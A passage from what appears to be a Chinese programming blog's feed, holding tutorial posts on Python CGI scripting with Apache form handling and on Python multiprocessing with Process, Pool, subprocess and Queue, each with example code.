</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>本文是对python实现并发的学习总结，具体有python进程并发编程的几种方式以及它们之间的关联与区别，通过实例来体现与利用，最后的实例加上了爬虫的内容，这是再学习安全之余对于编程的学习，安全最后还是离不开代码，相辅相成。</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>线程池</tag>
        <tag>进程池</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>python CGI编程</title>
    <url>/2018/06/17/python-CGI%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="python-CGI编程"><a href="#python-CGI编程" class="headerlink" title="python CGI编程"></a>python CGI编程</h2><p>###什么是CGI</p>
<blockquote>
<p>CGI(Commom Gateway Interface)通用网关接口，它是一段程序，运行在服务器。如HTTP服务器，提供同客户端HTML页面的接口。</p>
</blockquote>
<h3 id="网页浏览"><a href="#网页浏览" class="headerlink" title="网页浏览"></a>网页浏览</h3><blockquote>
<p>通过在网页上点击一个链接或URL的流程了解CGI是如何工作的</p>
</blockquote>
<ol>
<li>使用浏览器访问URL连接到HTTP web 服务器</li>
<li>web 服务器接收到请求以后解析URL，并查找访问文件是否在HTTP服务器上存在，如果存在返回内容，不存在返回错误信息</li>
<li>CGI程序可以是python脚本，Perl脚本，shell脚本，C或C++程序等</li>
</ol>
<h3 id="CGI架构图及其本地环境配置"><a href="#CGI架构图及其本地环境配置" class="headerlink" title="CGI架构图及其本地环境配置"></a>CGI架构图及其本地环境配置</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529201542.26.png" alt></p>
<ul>
<li><p>采用PHPstudy+windows测试，修改httpd.conf配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查找一下自己的DocumentRoot </span><br><span class="line">DocumentRoot  &quot;E:\Environment\phpstudy\PHPTutorial\WWW&quot;</span><br><span class="line"></span><br><span class="line">&lt;Directory /&gt;</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Options +ExecCGI</span><br><span class="line">    Order allow,deny  </span><br><span class="line">    Allow from all  </span><br><span class="line">    #Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line">#让apache识别py文件为cgi程序：</span><br><span class="line">AddHandler cgi-script .cgi .py </span><br><span class="line"></span><br><span class="line">只允许在特别目录下执行cgi程序:</span><br><span class="line">ScriptAlias /cgi-bin/ &quot;D:/Program/phpStudy/Apache/cgi-bin/&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试实例（python不用指定编码，测试了时候指定编码出现乱码）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Content-type:text/html"</span>)</span><br><span class="line"><span class="keyword">print</span> ()                             <span class="comment"># 空行，告诉服务器结束头部</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;html&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;head&gt;'</span>)</span><br><span class="line"><span class="comment"># print ('&lt;meta charset="UTF-8"&gt;')</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;title&gt;Hello Word 你好123！&lt;/title&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;/head&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;body&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;h2&gt; Hello Word! 菜鸟123&lt;/h2&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;/body&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;/html&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#作为http协议的要求，一定要输出http headers</span></span><br><span class="line"><span class="comment">#在存在http headers的前提下，一定要在headers后面打印一个空行，否则服务器会报错</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529204892.39.png" alt></p>
</li>
</ul>
<h3 id="CGI-HTTP头部及CGI环境变量"><a href="#CGI-HTTP头部及CGI环境变量" class="headerlink" title="CGI HTTP头部及CGI环境变量"></a>CGI HTTP头部及CGI环境变量</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205175.71.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205233.0.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205252.14.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205271.41.png" alt></p>
<h3 id="CGI实例"><a href="#CGI实例" class="headerlink" title="CGI实例"></a>CGI实例</h3><ol>
<li><p>通过CGI输出CGI环境变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">print(<span class="string">"Content-type: text/html"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"&lt;b&gt;环境变量&lt;/b&gt;&lt;br&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;ul&gt;"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> os.environ.keys():</span><br><span class="line">    print(<span class="string">"&lt;li&gt;&lt;span style='color:green'&gt;%30s&lt;/span&gt; : %s&lt;/li&gt;"</span> % (i,os.environ[i]))</span><br><span class="line">print(<span class="string">"&lt;/ul&gt;"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205971.94.png" alt></p>
</li>
<li><p>通过CGI实现GET传递信息（也可以通过构造表单的方法实现GET信息传递，默认情况下只存放脚本文件）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建filedstorage的实例、</span></span><br><span class="line">form = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据</span></span><br><span class="line">s_name = form.getvalue(<span class="string">'name'</span>)</span><br><span class="line">s_url = form.getvalue(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Content-type:text/html"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;title&gt;测试&lt;/title&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;%s博客：%s&lt;/h2&gt;"</span> % (s_name,s_url))</span><br><span class="line">print(<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529208739.64.png" alt></p>
</li>
<li><p>通过CGI用POST传递数据（使用上面的GET脚本结合表单来POST传递）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"get1.py"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">站点名称: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">站点 URL: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"url"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529209260.07.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529209306.54.png" alt></p>
</li>
<li><p>通过CGI程序来传递CheckBox数据（需要一个表单和CGI处理的脚本文件）</p>
<ul>
<li><p>cgi脚本文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb</span><br><span class="line"></span><br><span class="line">form = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收字段数据</span></span><br><span class="line"><span class="keyword">if</span> form.getvalue(<span class="string">'google'</span>):</span><br><span class="line">    google_flag = <span class="string">"是"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    google_flag = <span class="string">"否"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> form.getvalue(<span class="string">'lsowl'</span>):</span><br><span class="line">    lsowl_flag = <span class="string">"是"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    lsowl_flag = <span class="string">"否"</span></span><br><span class="line">print(<span class="string">"Content-type:text/html"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;title&gt;测试&lt;/title&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;lsowl是否选择了 : %s&lt;/h2&gt;"</span> % lsowl_flag)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;google是否选择了 : %s&lt;/h2&gt;"</span> % google_flag)</span><br><span class="line">print(<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>传递数据的表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"checkbox.py"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"lsowl"</span> <span class="attr">value</span>=<span class="string">"on"</span> /&gt;</span> lsowl</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"google"</span><span class="attr">value</span>=<span class="string">"on"</span> /&gt;</span> google</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"选择站点"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211130.67.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211139.71.png" alt></p>
</li>
</ul>
</li>
<li><p>通过CGI传递Radio数据（只向服务器传输一个数据）</p>
<ul>
<li><p>传递Radio数据的CGI脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb</span><br><span class="line"></span><br><span class="line">form = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> form.getvalue(<span class="string">'site'</span>):</span><br><span class="line">    site = form.getvalue(<span class="string">'site'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    site = <span class="string">'提交的数据为空'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Content-type:text/html"</span>)</span><br><span class="line"><span class="keyword">print</span> ()</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;title&gt;测试&lt;/title&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;h2&gt; 选中的网站是 %s&lt;/h2&gt;"</span> % site)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>传递Radio数据的CGI表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"radion.py"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"site"</span> <span class="attr">value</span>=<span class="string">"lsowl"</span> /&gt;</span> lsowl</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"site"</span> <span class="attr">value</span>=<span class="string">"google"</span> /&gt;</span> Google</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211658.49.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211669.84.png" alt></p>
</li>
</ul>
</li>
<li><p>通过CGI程序传递 Textarea 数据、下拉数据等、设置cookie、上传下载文件，这些只需要改一些HTML方法就可以实现，和上面的本质上没有什么区别</p>
</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>本文是对python的CGI编程的一个学习，学习了CGI及python CGI编程的特性，通过CGI结合前端实现许多功能，由于后面上传下载文件这些只是修改一些方法和HTML元素，本质上差别不大，就没有写完了，可以参考链接</p>
<p>tp://<a href="http://www.runoob.com/python3/python3-cgi-programming.html" target="_blank" rel="noopener">www.runoob.com/python3/python3-cgi-programming.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>CGI编程</tag>
      </tags>
  </entry>
  <entry>
    <title>python多进程</title>
    <url>/2018/06/16/python%E5%A4%9A%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="python多进程"><a href="#python多进程" class="headerlink" title="python多进程"></a>python多进程</h2><blockquote>
<p>python跨平台实现多进程需要使用multiprocessing这个模块，在模块中常用的两个类是process和pool</p>
</blockquote>
<h2 id="process类"><a href="#process类" class="headerlink" title="process类"></a>process类</h2><blockquote>
<p>process类用来描述一个进程对象。创建子进程的时候只需要传入一个执行函数和函数的参数就可以完成process实例的创建。</p>
</blockquote>
<ul>
<li><p>start() 方法启动进程</p>
</li>
<li><p>join()  方法实现进程之间的同步，等待所有进程退出</p>
</li>
<li><p>close()方法阻止多余的进程涌入进程池pool造成进程阻塞</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> __init__(self, group=<span class="keyword">None</span>, target=<span class="keyword">None</span>, name=<span class="keyword">None</span>, args=(), kwargs=&#123;&#125;, *,mon=<span class="keyword">None</span>)</span><br><span class="line">|      初始化类，target指向函数名，name参数可以为该进程设置名称，args是为target指向的函数传入的参数，且为tuple类型的</span><br><span class="line">|</span><br><span class="line">|  is_alive(self)</span><br><span class="line">|      返回这个进程是否alive</span><br><span class="line">|</span><br><span class="line">|  join(self, timeout=<span class="keyword">None</span>)</span><br><span class="line">|      等待，直到子进程执行完毕</span><br><span class="line">|</span><br><span class="line">|  run(self)</span><br><span class="line">|      Method to be run <span class="keyword">in</span> sub-process; can be overridden <span class="keyword">in</span> sub-<span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class">|</span></span><br><span class="line"><span class="class">|  <span class="title">start</span><span class="params">(self)</span></span></span><br><span class="line"><span class="class">|      开启子进程</span></span><br><span class="line"><span class="class">|</span></span><br><span class="line"><span class="class">|  <span class="title">terminate</span><span class="params">(self)</span></span></span><br><span class="line"><span class="class">|      结束进程</span></span><br><span class="line"><span class="class">|  ----------------------------------------------------------------------</span></span><br><span class="line"><span class="class">|  <span class="title">Data</span> <span class="title">descriptors</span> <span class="title">inherited</span> <span class="title">from</span> <span class="title">multiprocessing</span>.<span class="title">process</span>.<span class="title">BaseProcess</span>:</span></span><br><span class="line">|</span><br><span class="line">|  __dict__</span><br><span class="line">|      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined)</span><br><span class="line">|</span><br><span class="line">|  __weakref__</span><br><span class="line">|      list of weak references to the object (<span class="keyword">if</span> defined)</span><br><span class="line">|</span><br><span class="line">|  authkey</span><br><span class="line">|</span><br><span class="line">|  daemon</span><br><span class="line">|      返回该进程是否为守护进程</span><br><span class="line">|</span><br><span class="line">|  exitcode</span><br><span class="line">|      返回进程的退出代码</span><br><span class="line">|</span><br><span class="line">|  ident</span><br><span class="line">|      Return identifier (PID) of process <span class="keyword">or</span> `<span class="keyword">None</span>` <span class="keyword">if</span> it has yet to start</span><br><span class="line">|</span><br><span class="line">|  name</span><br><span class="line">|</span><br><span class="line">|  pid</span><br><span class="line">|      Return identifier (PID) of process <span class="keyword">or</span> `<span class="keyword">None</span>` <span class="keyword">if</span> it has yet to start</span><br></pre></td></tr></table></figure>
</li>
<li><p>process类使用实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing,os</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_proc</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">'Child process &#123;0&#125; &#123;1&#125; Running'</span>.format(name,os.getpid()))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'Parent process &#123;0&#125; is Running'</span>.format(os.getpid()))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        p = multiprocessing.Process(target=run_proc,args=(str(i),))</span><br><span class="line">        print(<span class="string">'process start'</span>)</span><br><span class="line">        p.start()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">'process close'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#这里创建多个进程可以使用for循环，也可以使用进程池，在使用for循环的时候注意join方法在for循环之外</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Pool类"><a href="#Pool类" class="headerlink" title="Pool类"></a>Pool类</h2><ul>
<li><p>Pool类可以提供指定数量的进程供用户使用，默认是CPU核数。当有新的请求提交到Pool的时候，如果进程池没有满，则会创建一个进程执行，如果进程池满了，则会让该请求等待。</p>
</li>
<li><p>Pool对象调用join方法会等待所有的子进程执行完毕</p>
</li>
<li><p>调用join方法前必须调用close()</p>
</li>
<li><p>调用close()以后就不能继续添加新的Process</p>
</li>
<li><p>pool.apply_async() 直接启动了进程，不用使用start来启动（同步执行进程，允许多个进程同时进入进程池）</p>
</li>
<li><p>pool类使用实例（使用apply_async()来执行进程）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_task</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; pid &#123;1&#125; is Running, Parent id is &#123;2&#125;'</span>.format(name,os.getpid(),os.getppid()))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; end'</span>.format(name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'current process &#123;0&#125;'</span>.format(os.getpid()))</span><br><span class="line">    p = multiprocessing.Pool(processes=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        p.apply_async(run_task,args=(i,))</span><br><span class="line">    print(<span class="string">'Waiting for all subprocesses done...'</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">'All process done!'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529156949.15.png" alt></p>
</li>
<li><p>pool使用实例（pool.apply(func[,args[，kwds]]) 只允许一个进程进入进程池，在一个进程结束以后，另外一个进程才可以进入执行）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_task</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; pid &#123;1&#125; is running, parent id is &#123;2&#125;'</span>.format(name, os.getpid(), os.getppid()))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; end.'</span>.format(name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'current process &#123;0&#125;'</span>.format(os.getpid()))</span><br><span class="line">    p = multiprocessing.Pool(processes=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        p.apply(run_task,args=(i,))</span><br><span class="line">    print(<span class="string">'Waiting for all subprocesses done...'</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">'All process done!'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529156984.47.png" alt></p>
</li>
</ul>
<h2 id="进程间的通信"><a href="#进程间的通信" class="headerlink" title="进程间的通信"></a>进程间的通信</h2><ol>
<li><p>使用python标准库中的subprocess包来fork一个子进程，并运行一个外部的程序</p>
<ul>
<li><p>subprocess.call(command,shell=True) fork一个子进程，并运行一个外部程序(命令)在本进程中显示结果</p>
</li>
<li><p>subprocess.check_output(command)   将外部命令执行结果放入变量，不在控制台输出</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529158361.89.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529158413.44.png" alt></p>
</li>
<li><p>可以看出subprocess.call和check_output的返回结果，call执行成功返回一个0，否则返回非零数，check_output返回命令执行的结果</p>
</li>
</ul>
</li>
<li><p>multiprocessing提供的Queue（Queue用来在多个进程间的通信，Queue有两个方法，get和put）</p>
<ul>
<li><p>put方法用来插入数据到队列中。有两个可选参数，blocked和timeout</p>
<ul>
<li>blocked = True（默认值），timeout 为正</li>
</ul>
<blockquote>
<p>该方法会阻塞 timeout 指定的时间，直到该队列有剩余空间。如果超时，抛出 Queue.Full 异常</p>
</blockquote>
<ul>
<li>blocked = False </li>
</ul>
<blockquote>
<p>如果 Queue 已满，<code>立刻</code>抛出 Queue.Full 异常</p>
</blockquote>
</li>
<li><p>get方法用来从队列中读取并删除一个元素。有两个参数可选，blocked 和 timeout</p>
<ul>
<li>blocked = False （默认），timeout 正值</li>
</ul>
<blockquote>
<p>等待时间内，没有取到任何元素，会抛出 Queue.Empty 异常</p>
</blockquote>
<ul>
<li>blocked = True</li>
</ul>
<blockquote>
<p>Queue 有一个值可用，立刻返回改值；Queue 没有任何元素</p>
</blockquote>
</li>
<li><p>Queue实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Queue</span><br><span class="line"><span class="keyword">import</span> os, time, random</span><br><span class="line"> </span><br><span class="line"><span class="comment">#写数据进程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proc_write</span><span class="params">(q,urls)</span>:</span></span><br><span class="line">    print(<span class="string">'Process &#123;0&#125; is writing...'</span>.format(os.getpid()))</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        q.put(url)</span><br><span class="line">        print(<span class="string">'Put %s to queue..'</span> % url)</span><br><span class="line">        time.sleep(random.random())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#读数据进程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proc_read</span><span class="params">(q)</span>:</span></span><br><span class="line">    print(<span class="string">'Process &#123;0&#125; is reading...'</span>.format(os.getpid()))</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        url = q.get(<span class="keyword">True</span>)</span><br><span class="line">        print(<span class="string">'Get %s from queue...'</span> % url)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    proc_write1 = Process(target=proc_write,args=(q,[<span class="string">'url_1'</span>,<span class="string">'url_2'</span>,<span class="string">'url_3'</span>,<span class="string">'url_4'</span>]))</span><br><span class="line">    proc_write2 = Process(target=proc_write,args=(q,[<span class="string">'url_4'</span>,<span class="string">'url_5'</span>,<span class="string">'url_6'</span>]))</span><br><span class="line">    proc_reader = Process(target=proc_read,args=(q,))</span><br><span class="line">    <span class="comment">#启动子进程写入</span></span><br><span class="line">    proc_write1.start()</span><br><span class="line">    proc_write2.start()</span><br><span class="line">    <span class="comment">#启动子进程读取</span></span><br><span class="line">    proc_reader.start()</span><br><span class="line">    <span class="comment">#等待写入进程结束</span></span><br><span class="line">    proc_write1.join()</span><br><span class="line">    proc_write2.join()</span><br><span class="line">    <span class="comment">#proc_reader进程是死循环，无法等待结束，只能强行终止</span></span><br><span class="line">    proc_reader.terminate()</span><br></pre></td></tr></table></figure>
